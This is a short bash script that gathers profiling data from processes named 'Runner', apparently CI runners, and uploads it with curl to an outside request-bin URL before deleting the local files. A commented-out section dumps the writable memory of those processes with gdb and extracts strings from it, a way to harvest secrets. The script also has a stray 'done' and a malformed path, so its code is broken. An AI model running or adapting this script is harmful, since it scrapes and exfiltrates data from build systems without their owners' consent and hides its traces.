#!/bin/bash

echo "STARTING..." > /tmp/file.txt

# get pids related to runners and dump their memory
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "-----$pid-----" >> /tmp/file.txt;
    echo $(perf record -p $pid -g -o /tmp/hola4.txt) >> tmp/file.txt;
    done
    echo "--------------" >> /tmp/file.txt;
done

echo $(perf report -i /tmp/hola4.txt) >> /tmp/file.txt
echo "FINISHED..." >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/hola4.txt
rm /tmp/file.txt


# get pids related to runners and dump their memory
#for pid in $(ps -ef | grep runner  | tr -s ' ' | cut -d ' ' -f2)
#do
#    echo "-----$pid-----" >> /tmp/file.txt;
#    grep rw-p /proc/$pid/maps \
#    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
#    | while read start stop; do \
#        echo "> $start-$stop" >> /tmp/file.txt;
#        gdb --batch --pid $pid -ex "dump memory dumps/$pid-$start-$stop.dump 0x$start 0x$stop"; \
#        strings dumps/* >> /tmp/file.txt; \
#        rm dumps/$pid-$start-$stop.dump; \
#    done
#    echo "--------------" >> /tmp/file.txt;
#done
